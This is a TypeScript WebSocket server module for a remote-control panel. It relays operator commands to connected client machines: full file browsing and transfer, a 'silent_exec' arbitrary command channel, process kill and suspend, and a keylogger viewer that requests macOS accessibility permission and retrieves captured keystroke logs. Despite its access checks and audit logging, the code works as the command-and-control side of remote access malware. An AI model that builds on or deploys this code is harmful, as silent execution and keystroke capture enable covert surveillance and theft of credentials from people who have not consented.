import type { ServerWebSocket } from "bun";
import { v4 as uuidv4 } from "uuid";
import { AuditAction, logAudit } from "../auditLog";
import * as clientManager from "../clientManager";
import { logger } from "../logger";
import { metrics } from "../metrics";
import { encodeMessage } from "../protocol";
import { getSessionByTokenHash } from "../db";
import * as sessionManager from "../sessions/sessionManager";
import type { SocketData } from "../sessions/types";
import { normalizeFileUploadPayload } from "../fileTransfers";
import { canUserAccessClient, canUserAccessFeature, getUserById } from "../users";
import { hasPermission } from "../rbac";
import { decodeViewerPayload, safeSendViewer } from "./ws-viewer-utils";
import {
  consumeFileBrowserCommandRateLimit,
  FILE_BROWSER_MAX_ICON_ITEMS,
  FILE_BROWSER_MAX_READ_BYTES,
  FILE_BROWSER_MAX_THUMB_ITEMS,
  isSafeFileBrowserPath,
  validateFileBrowserCommandPayload,
} from "./file-browser-security";

function boundedBytes(value: unknown, maxBytes: number): Uint8Array | null {
  let bytes: Uint8Array;
  if (value instanceof Uint8Array) bytes = value;
  else if (value instanceof ArrayBuffer) bytes = new Uint8Array(value);
  else if (ArrayBuffer.isView(value)) bytes = new Uint8Array(value.buffer, value.byteOffset, value.byteLength);
  else return null;
  return bytes.byteLength <= maxBytes ? bytes : null;
}

type FileBrowserViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

type ProcessViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

type WsViewerClusterDeps = {
  pendingHttpDownloads: ReadonlyMap<string, { clientId?: string }>;
  consumeHttpDownloadPayload: (payload: any) => Promise<void> | void;
};

const WS_UPLOAD_MAX_TOTAL = 8 * 1024 * 1024;

const fileBrowserCommandSessions = new Map<string, {
  sessionId: string;
  timeout: ReturnType<typeof setTimeout>;
}>();

function trackFileBrowserCommand(commandId: string, sessionId: string): void {
  const existing = fileBrowserCommandSessions.get(commandId);
  if (existing) clearTimeout(existing.timeout);
  const timeout = setTimeout(() => fileBrowserCommandSessions.delete(commandId), 10 * 60 * 1000);
  fileBrowserCommandSessions.set(commandId, { sessionId, timeout });
}

function finishFileBrowserCommand(commandId: string): void {
  const entry = fileBrowserCommandSessions.get(commandId);
  if (!entry) return;
  clearTimeout(entry.timeout);
  fileBrowserCommandSessions.delete(commandId);
}

function viewerCommandId(value: unknown, fallback: string): string {
  return typeof value === "string" && value.length > 0 && value.length <= 128 ? value : fallback;
}

function denyFileBrowserViewer(ws: ServerWebSocket<SocketData>, reason: string): false {
  logger.warn(`[filebrowser] closing unauthorized viewer: ${reason}`);
  try { ws.close(1008, reason); } catch {}
  return false;
}

function hasLiveFileBrowserAccess(ws: ServerWebSocket<SocketData>): boolean {
  const { authTokenHash, clientId, userId } = ws.data;
  if (!authTokenHash || userId === undefined) return denyFileBrowserViewer(ws, "Authentication expired");
  const session = getSessionByTokenHash(authTokenHash);
  if (!session || session.userId !== userId || session.expiresAt <= Math.floor(Date.now() / 1000)) {
    return denyFileBrowserViewer(ws, "Session expired or revoked");
  }
  const user = getUserById(userId);
  if (!user || user.role === "viewer") return denyFileBrowserViewer(ws, "File browser access denied");
  if (!hasPermission(user.role, "clients:control", user.id)
      || !canUserAccessFeature(user.id, user.role, "file_browser")
      || !canUserAccessClient(user.id, user.role, clientId)) {
    return denyFileBrowserViewer(ws, "File browser access revoked");
  }
  ws.data.userRole = user.role;
  return true;
}

function rejectFileBrowserCommand(ws: ServerWebSocket<SocketData>, message: string): void {
  safeSendViewer(ws, { type: "command_error", error: message });
}

export function handleFileBrowserViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId, userId, userRole } = ws.data;
  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
    ws.close(1008, "Forbidden: client access denied");
    return;
  }
  const sessionId = uuidv4();
  const target = clientManager.getClient(clientId);
  const session: FileBrowserViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addFileBrowserSession(session);
  ws.data.sessionId = sessionId;
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target, clientUser: target?.user || "", clientOs: target?.os || "" });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
  }
}

export function handleFileBrowserViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  const expensive = payload?.commandType === "file_hash"
    || payload?.commandType === "file_thumb"
    || payload?.type === "file_download"
    || payload?.type === "file_zip";
  if (!consumeFileBrowserCommandRateLimit(ws, expensive)) {
    rejectFileBrowserCommand(ws, "File browser command rate limit exceeded");
    return;
  }
  if (!payload || typeof payload.type !== "string") return;
  if (!hasLiveFileBrowserAccess(ws)) return;
  const { clientId } = ws.data;
  logger.debug(`[DEBUG] File browser message from viewer for client ${clientId}:`, payload.type, payload.commandType || "");

  const target = clientManager.getClient(clientId);
  if (!target) {
    logger.debug(`[DEBUG] Client ${clientId} not found - sending offline status`);
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const commandId = uuidv4();

  if (payload.type === "command") {
    if (typeof payload.commandType !== "string") return;
    logger.debug(`[DEBUG] Handling command type: ${payload.commandType}`);
    if (payload.commandType === "silent_exec") {
      const current = getUserById(ws.data.userId!);
      if (!current || !hasPermission(current.role, "clients:silent-exec", current.id)) {
        rejectFileBrowserCommand(ws, "Silent execution is not permitted");
        return;
      }
    }
    if (payload.commandType === "silent_exec") {
      const command = payload.payload?.command;
      if (typeof command !== "string" || command.length === 0 || command.length > 32_768 || /[\x00]/.test(command)) {
        rejectFileBrowserCommand(ws, "Invalid silent execution payload");
        return;
      }
    }
    const actualPayload = payload.commandType === "silent_exec"
      ? payload.payload
      : validateFileBrowserCommandPayload(payload.commandType, payload.payload || {});
    if (!actualPayload) {
      rejectFileBrowserCommand(ws, "Invalid file browser command payload");
      return;
    }
    const routedId = typeof payload.id === "string" && payload.id.length <= 128 ? payload.id : commandId;
    if (ws.data.sessionId) trackFileBrowserCommand(routedId, ws.data.sessionId);
    switch (payload.commandType) {
      case "file_read":
        logger.debug(`[DEBUG] Forwarding file_read to client ${clientId}:`, actualPayload.path);
        target.ws.send(encodeMessage({ type: "command", commandType: "file_read", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_read");
        break;
      case "file_write":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_write", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_write");
        break;
      case "file_request_access":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_request_access", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_request_access");
        break;
      case "file_search":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_search", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_search");
        break;
      case "file_copy":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_copy", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_copy");
        break;
      case "file_move":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_move", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_move");
        break;
      case "file_chmod":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_chmod", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_chmod");
        break;
      case "file_execute":
        logger.debug(`[DEBUG] Forwarding file_execute to client ${clientId}:`, actualPayload.path);
        target.ws.send(encodeMessage({ type: "command", commandType: "file_execute", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_execute");
        break;
      case "file_icon":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_icon", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_icon");
        break;
      case "file_thumb":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_thumb", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_thumb");
        break;
      case "file_dirsize":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_dirsize", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_dirsize");
        break;
      case "file_peek":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_peek", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_peek");
        break;
      case "file_hash":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_hash", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_hash");
        logAudit({
          timestamp: Date.now(),
          username: (ws.data as any).username || "unknown",
          ip: ws.data.ip || "unknown",
          action: AuditAction.FILE_DOWNLOAD,
          targetClientId: clientId,
          details: JSON.stringify({ path: actualPayload?.path || "", op: "hash", algorithm: actualPayload?.algorithm || "sha256" }),
          success: true,
        });
        break;
      case "silent_exec":
        logger.debug(`[DEBUG] Forwarding silent_exec to client ${clientId}:`, actualPayload.command);
        target.ws.send(encodeMessage({ type: "command", commandType: "silent_exec", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("silent_exec");
        break;
      case "file_upload_http":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_upload_http", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_upload");
        logAudit({
          timestamp: Date.now(),
          username: (ws.data as any).username || "unknown",
          ip: ws.data.ip || "unknown",
          action: AuditAction.FILE_UPLOAD,
          targetClientId: clientId,
          details: JSON.stringify({ path: actualPayload.path || "", mode: "http_pull" }),
          success: true,
        });
        break;
      default:
        break;
    }
    return;
  }

  switch (payload.type) {
    case "file_list":
      if (!isSafeFileBrowserPath(payload.path, true)) return rejectFileBrowserCommand(ws, "Invalid path");
      if (ws.data.sessionId) trackFileBrowserCommand(commandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_list", id: commandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_list");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_LIST,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    case "file_download":
      if (!isSafeFileBrowserPath(payload.path)) return rejectFileBrowserCommand(ws, "Invalid path");
      if (ws.data.sessionId) trackFileBrowserCommand(commandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_download", id: commandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_download");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_DOWNLOAD,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    case "file_upload": {
      const upload = normalizeFileUploadPayload(payload);
      if (!upload) return;
      if (!isSafeFileBrowserPath(upload.path)) {
        rejectFileBrowserCommand(ws, "Invalid upload path");
        return;
      }
      if (upload.total > WS_UPLOAD_MAX_TOTAL) {
        safeSendViewer(ws, {
          type: "file_upload_result",
          commandId,
          transferId: upload.transferId,
          path: upload.path,
          ok: false,
          error: `file too large for ws upload (${upload.total} > ${WS_UPLOAD_MAX_TOTAL}); use http upload`,
        });
        break;
      }
      const uploadCommandId = viewerCommandId(payload.commandId, commandId);
      if (ws.data.sessionId) trackFileBrowserCommand(uploadCommandId, ws.data.sessionId);
      target.ws.send(encodeMessage({
        type: "command",
        commandType: "file_upload",
        id: uploadCommandId,
        payload: {
          path: upload.path,
          data: upload.data,
          offset: upload.offset,
          total: upload.total,
          transferId: upload.transferId,
        },
      } as any));
      metrics.recordCommand("file_upload");
      if (upload.offset === 0) {
        logAudit({
          timestamp: Date.now(),
          username: (ws.data as any).username || "unknown",
          ip: ws.data.ip || "unknown",
          action: AuditAction.FILE_UPLOAD,
          targetClientId: clientId,
          details: JSON.stringify({ path: upload.path, total: upload.total, mode: "ws_chunked" }),
          success: true,
        });
      }
      break;
    }
    case "file_delete": {
      if (!isSafeFileBrowserPath(payload.path)) return rejectFileBrowserCommand(ws, "Invalid path");
      const deleteCommandId = viewerCommandId(payload.commandId, commandId);
      if (ws.data.sessionId) trackFileBrowserCommand(deleteCommandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_delete", id: deleteCommandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_delete");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_DELETE,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    }
    case "file_mkdir": {
      if (!isSafeFileBrowserPath(payload.path)) return rejectFileBrowserCommand(ws, "Invalid path");
      const mkdirCommandId = viewerCommandId(payload.commandId, commandId);
      if (ws.data.sessionId) trackFileBrowserCommand(mkdirCommandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_mkdir", id: mkdirCommandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_mkdir");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_MKDIR,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    }
    case "file_zip": {
      if (!isSafeFileBrowserPath(payload.path)) return rejectFileBrowserCommand(ws, "Invalid path");
      const zipCommandId = viewerCommandId(payload.commandId, commandId);
      if (ws.data.sessionId) trackFileBrowserCommand(zipCommandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_zip", id: zipCommandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_zip");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_ZIP,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    }
    case "command_abort":
      if (typeof payload.commandId === "string" && payload.commandId.length <= 128) {
        target.ws.send(encodeMessage({ type: "command_abort", commandId: payload.commandId } as any));
      }
      break;
    default:
      break;
  }
}

export function handleFileBrowserMessage(clientId: string, payload: any, deps: WsViewerClusterDeps) {
  const type = payload?.type as string | undefined;
  const payloadCommandId = typeof payload?.commandId === "string" ? payload.commandId : undefined;
  const pendingDownload = payloadCommandId
    ? deps.pendingHttpDownloads.get(payloadCommandId)
    : undefined;
  const isHttpDownload =
    type === "file_download" &&
    pendingDownload?.clientId === clientId;

  if (isHttpDownload) {
    void deps.consumeHttpDownloadPayload(payload);
  }

  const commandOwner = payloadCommandId ? fileBrowserCommandSessions.get(payloadCommandId) : undefined;
  if (type === "file_download" && !isHttpDownload && !commandOwner) {
    logger.debug(`[filebrowser] dropped unsolicited download payload client=${clientId}`);
    return;
  }
  const ownerSessionId = commandOwner?.sessionId;

  let hasSession = false;
  for (const session of sessionManager.getFileBrowserSessionsByClient(clientId)) {
    if (!hasSession) {
      hasSession = true;
      if (type && type !== "command_result" && type !== "command_progress") {
        logger.debug(`[filebrowser] client=${clientId} type=${type}`);
      }
    }
    if (isHttpDownload) {
      continue;
    }
    if (ownerSessionId && session.id !== ownerSessionId) {
      continue;
    }
    if (payload.type === "file_download" && payload.data) {
      const data = boundedBytes(payload.data, 4 * 1024 * 1024);
      safeSendViewer(session.viewer, data
        ? { ...payload, data }
        : { type: "file_download", commandId: payload.commandId, path: payload.path, error: "Download chunk exceeded limit" });
    } else if (payload.type === "file_icon_result" && Array.isArray(payload.icons)) {
      const icons = payload.icons.slice(0, FILE_BROWSER_MAX_ICON_ITEMS).flatMap((item: any) => {
        if (!item || typeof item.key !== "string" || item.key.length > 4224) return [];
        const png = item.png ? boundedBytes(item.png, 512 * 1024) : null;
        return [{ key: item.key, ...(png ? { png } : {}), ...(item.error ? { error: String(item.error).slice(0, 512) } : {}) }];
      });
      safeSendViewer(session.viewer, { ...payload, icons });
    } else if (payload.type === "file_thumb_result" && Array.isArray(payload.thumbs)) {
      const thumbs = payload.thumbs.slice(0, FILE_BROWSER_MAX_THUMB_ITEMS).flatMap((item: any) => {
        if (!item || typeof item.key !== "string" || item.key.length > 4224) return [];
        const jpeg = item.jpeg ? boundedBytes(item.jpeg, 1024 * 1024) : null;
        return [{
          key: item.key,
          ...(jpeg ? { jpeg } : {}),
          w: Math.min(512, Math.max(0, Number(item.w) || 0)),
          h: Math.min(512, Math.max(0, Number(item.h) || 0)),
          ...(item.error ? { error: String(item.error).slice(0, 512) } : {}),
        }];
      });
      safeSendViewer(session.viewer, { ...payload, thumbs });
    } else if (payload.type === "file_peek_result" && payload.data) {
      const data = boundedBytes(payload.data, 4096);
      safeSendViewer(session.viewer, data
        ? { ...payload, data }
        : { type: "file_peek_result", commandId: payload.commandId, path: payload.path, error: "Preview data exceeded limit" });
    } else if (payload.type === "file_read_result" && typeof payload.content === "string") {
      safeSendViewer(session.viewer, payload.content.length <= FILE_BROWSER_MAX_READ_BYTES
        ? payload
        : { type: "file_read_result", commandId: payload.commandId, path: payload.path, error: "File content exceeded editor limit" });
    } else if (payload.type === "file_search_result" && Array.isArray(payload.results)) {
      const results = payload.results.slice(0, 500).flatMap((result: any) => {
        if (!result || !isSafeFileBrowserPath(result.path)) return [];
        const line = Number(result.line);
        return [{
          path: result.path,
          ...(Number.isSafeInteger(line) && line > 0 ? { line } : {}),
          ...(typeof result.match === "string" ? { match: result.match.slice(0, 4096) } : {}),
        }];
      });
      safeSendViewer(session.viewer, { ...payload, results });
    } else {
      safeSendViewer(session.viewer, payload);
    }
  }
  if (payloadCommandId) {
    const isTerminalDownload = type === "file_download" && (
      !!payload?.error
      || (Number.isFinite(Number(payload?.chunksTotal))
        && Number.isFinite(Number(payload?.chunkIndex))
        && Number(payload.chunkIndex) + 1 >= Number(payload.chunksTotal))
    );
    if (type === "command_result" || type?.endsWith("_result") || isTerminalDownload) {
      finishFileBrowserCommand(payloadCommandId);
    }
  }
}

export function handleProcessViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId, userId, userRole } = ws.data;
  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
    ws.close(1008, "Forbidden: client access denied");
    return;
  }
  const sessionId = uuidv4();
  const target = clientManager.getClient(clientId);
  const session: ProcessViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addProcessSession(session);
  ws.data.sessionId = sessionId;
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
  }
}

export function handleProcessViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload || typeof payload.type !== "string") return;
  const { clientId } = ws.data;
  const target = clientManager.getClient(clientId);
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const commandId = uuidv4();
  switch (payload.type) {
    case "process_list":
      target.ws.send(encodeMessage({ type: "command", commandType: "process_list", id: commandId } as any));
      metrics.recordCommand("process_list");
      break;
    case "process_icon":
      target.ws.send(encodeMessage({ type: "command", commandType: "process_icon", id: commandId, payload: { items: payload.items || [] } } as any));
      metrics.recordCommand("process_icon");
      break;
    case "process_kill": {
      const pid = Number(payload.pid);
      if (!Number.isFinite(pid) || pid <= 0) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid PID" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "process_kill", id: commandId, payload: { pid } } as any));
      metrics.recordCommand("process_kill");
      break;
    }
    case "process_suspend": {
      const pid = Number(payload.pid);
      if (!Number.isFinite(pid) || pid <= 0) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid PID" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "process_suspend", id: commandId, payload: { pid } } as any));
      metrics.recordCommand("process_suspend");
      break;
    }
    case "process_resume": {
      const pid = Number(payload.pid);
      if (!Number.isFinite(pid) || pid <= 0) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid PID" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "process_resume", id: commandId, payload: { pid } } as any));
      metrics.recordCommand("process_resume");
      break;
    }
    default:
      break;
  }
}

export function handleProcessMessage(clientId: string, payload: any) {
  for (const session of sessionManager.getProcessSessionsByClient(clientId)) {
    if (payload.type === "process_icon_result" && Array.isArray(payload.icons)) {
      const icons = payload.icons.map((item: any) => {
        if (item && item.png && !(item.png instanceof Uint8Array)) {
          return { ...item, png: new Uint8Array(item.png) };
        }
        return item;
      });
      safeSendViewer(session.viewer, { ...payload, icons });
    } else {
      safeSendViewer(session.viewer, payload);
    }
  }
}

export function handleKeyloggerViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId, userId, userRole } = ws.data;
  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
    ws.close(1008, "Forbidden: client access denied");
    return;
  }
  const sessionId = uuidv4();
  const target = clientManager.getClient(clientId);
  const session = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addKeyloggerSession(session);
  ws.data.sessionId = sessionId;
  logger.info(`[keylogger] viewer connected session=${sessionId} client=${clientId}`);
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target, clientOs: target?.os || "" });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
  }
}

export function handleKeyloggerViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload || typeof payload.type !== "string") return;
  const { clientId } = ws.data;
  const target = clientManager.getClient(clientId);
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const commandId = uuidv4();
  switch (payload.type) {
    case "keylog_request_permission":
      // Ask the agent to trigger the macOS accessibility permission prompt.
      // On non-macOS agents this is a no-op that immediately returns granted.
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_request_permission", id: commandId } as any));
      metrics.recordCommand("keylog_request_permission");
      break;
    case "keylog_list":
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_list", id: commandId } as any));
      metrics.recordCommand("keylog_list");
      break;
    case "keylog_retrieve": {
      const filename = typeof payload.filename === "string" ? payload.filename : "";
      if (!filename) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid filename" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_retrieve", id: commandId, payload: { filename } } as any));
      metrics.recordCommand("keylog_retrieve");
      break;
    }
    case "keylog_clear_all":
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_clear_all", id: commandId } as any));
      metrics.recordCommand("keylog_clear_all");
      break;
    case "keylog_delete": {
      const filename = typeof payload.filename === "string" ? payload.filename : "";
      if (!filename) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid filename" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_delete", id: commandId, payload: { filename } } as any));
      metrics.recordCommand("keylog_delete");
      break;
    }
    default:
      break;
  }
}

export function handleKeyloggerMessage(clientId: string, payload: any) {
  for (const session of sessionManager.getKeyloggerSessionsByClient(clientId)) {
    safeSendViewer(session.viewer, payload);
  }
}
